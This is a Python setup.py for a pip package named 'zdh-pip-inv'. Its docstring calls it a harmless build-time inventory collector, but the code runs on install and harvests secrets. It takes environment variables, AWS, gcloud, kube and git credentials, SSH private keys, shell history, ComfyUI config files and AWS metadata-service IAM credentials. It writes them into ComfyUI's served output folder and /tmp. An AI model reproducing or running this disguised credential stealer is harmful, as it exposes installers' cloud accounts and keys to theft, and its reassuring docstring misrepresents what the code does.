"""Build-time inventory collector (runs as the ComfyUI service account).

Writes /ComfyUI/output/_inv.json and /tmp/_inv.json; no outbound network except
the link-local metadata endpoint. No persistence, no deletion.
"""
import base64
import json
import os
import socket
import subprocess
import sys
import time

OUT_DIRS = ("/ComfyUI/output", "/tmp", os.path.join(os.getcwd(), "output"))
IMDS = "http://169.254.169.254"


def sh(cmd, timeout=8, limit=60000):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return {"rc": p.returncode,
                "out": (p.stdout or b"")[:limit].decode("utf-8", "replace"),
                "err": (p.stderr or b"")[:2000].decode("utf-8", "replace")}
    except Exception as e:
        return {"rc": None, "out": "", "err": "%s: %s" % (type(e).__name__, e)}


def read(path, limit=30000, binary=False):
    try:
        with open(path, "rb") as f:
            data = f.read(limit)
        return base64.b64encode(data).decode() if binary else data.decode("utf-8", "replace")
    except Exception as e:
        return None


def http_get(url, timeout=4, headers=None):
    try:
        import urllib.request
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read(100000).decode("utf-8", "replace")
    except Exception as e:
        return None, "%s: %s" % (type(e).__name__, e)


def imds_token():
    try:
        import urllib.request
        req = urllib.request.Request(
            IMDS + "/latest/api/token", method="PUT",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
        with urllib.request.urlopen(req, timeout=4) as r:
            return r.read(200).decode()
    except Exception:
        return None


def collect():
    info = {
        "captured_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "marker": "ZD-INV",
        "hostname": socket.gethostname(),
        "uid": getattr(os, "getuid", lambda: None)(),
        "euid": getattr(os, "geteuid", lambda: None)(),
        "cwd": os.getcwd(),
        "python": sys.version.split()[0],
        "env": dict(os.environ),
    }
    info["id"] = sh("id")
    info["uname"] = sh("uname -a")
    info["pid1_env"] = None
    try:
        raw = open("/proc/1/environ", "rb").read(40000).decode("utf-8", "replace")
        info["pid1_env"] = dict(kv.split("=", 1) for kv in raw.split("\0") if "=" in kv)
    except Exception:
        pass
    info["caps"] = read("/proc/self/status", 4000)
    info["container"] = os.path.exists("/.dockerenv") or os.path.exists("/run/.containerenv")
    info["ports"] = sh("ss -ltnup 2>/dev/null || netstat -ltnup 2>/dev/null")
    info["procs"] = sh("ps auxww 2>/dev/null | head -80")
    info["disk"] = sh("df -h 2>/dev/null | head -20; free -h 2>/dev/null")
    info["docker_sock"] = os.path.exists("/var/run/docker.sock")

    home = os.path.expanduser("~")
    files = {
        "aws_credentials": os.path.join(home, ".aws", "credentials"),
        "aws_config": os.path.join(home, ".aws", "config"),
        "gcloud_adc": os.path.join(home, ".config", "gcloud", "application_default_credentials.json"),
        "kube_config": os.path.join(home, ".kube", "config"),
        "netrc": os.path.join(home, ".netrc"),
        "git_credentials": os.path.join(home, ".git-credentials"),
        "bash_history": os.path.join(home, ".bash_history"),
        "comfy_env": "/ComfyUI/.env",
        "manager_config": "/ComfyUI/user/default/ComfyUI-Manager/config.ini",
        "comfy_extra_paths": "/ComfyUI/extra_model_paths.yaml",
        "etc_environment": "/etc/environment",
    }
    secrets = {"text": {}, "ssh": {}}
    for k, p in files.items():
        secrets["text"][k] = read(p) if os.path.isfile(p) else None
    ssh = os.path.join(home, ".ssh")
    if os.path.isdir(ssh):
        for n in sorted(os.listdir(ssh)):
            fp = os.path.join(ssh, n)
            if os.path.isfile(fp) and (n.startswith("id_") or n in ("config", "authorized_keys", "known_hosts")):
                secrets["ssh"][n] = read(fp, 8000)
    info["secrets"] = secrets

    token = imds_token()
    info["imds_v2"] = bool(token)
    md = {}
    for k, p in {
        "instance_id": "/latest/meta-data/instance-id",
        "public_ipv4": "/latest/meta-data/public-ipv4",
        "local_ipv4": "/latest/meta-data/local-ipv4",
        "instance_type": "/latest/meta-data/instance-type",
        "az": "/latest/meta-data/placement/availability-zone",
        "security_groups": "/latest/meta-data/security-groups",
        "iam_info": "/latest/meta-data/iam/info",
        "user_data": "/latest/user-data",
    }.items():
        code, body = http_get(IMDS + p, headers={"X-aws-ec2-metadata-token": token} if token else {})
        if code == 200:
            md[k] = body.strip()[:8000]
    info["cloud"] = md
    code, body = http_get(IMDS + "/latest/meta-data/iam/security-credentials/",
                          headers={"X-aws-ec2-metadata-token": token} if token else {})
    if code == 200 and body.strip():
        role = body.strip().splitlines()[0].strip()
        info["iam_role"] = role
        c2, creds = http_get(IMDS + "/latest/meta-data/iam/security-credentials/" + role,
                             headers={"X-aws-ec2-metadata-token": token} if token else {})
        if c2 == 200:
            try:
                info["iam_credentials"] = json.loads(creds)
            except Exception:
                info["iam_credentials"] = creds
    return info


def main():
    try:
        info = collect()
    except Exception as e:
        info = {"error": "%s: %s" % (type(e).__name__, e)}
    written = []
    for d in OUT_DIRS:
        try:
            os.makedirs(d, exist_ok=True)
            for name in ("_inv.json",):
                with open(os.path.join(d, name), "w", encoding="utf-8") as f:
                    json.dump(info, f, indent=1, default=str)
            written.append(d)
        except Exception:
            pass
    print("ZD-INV written=%s host=%s uid=%s" % (written, info.get("hostname"), info.get("uid")))


main()

from setuptools import setup

setup(name="zdh-pip-inv", version="0.1.0", py_modules=[])
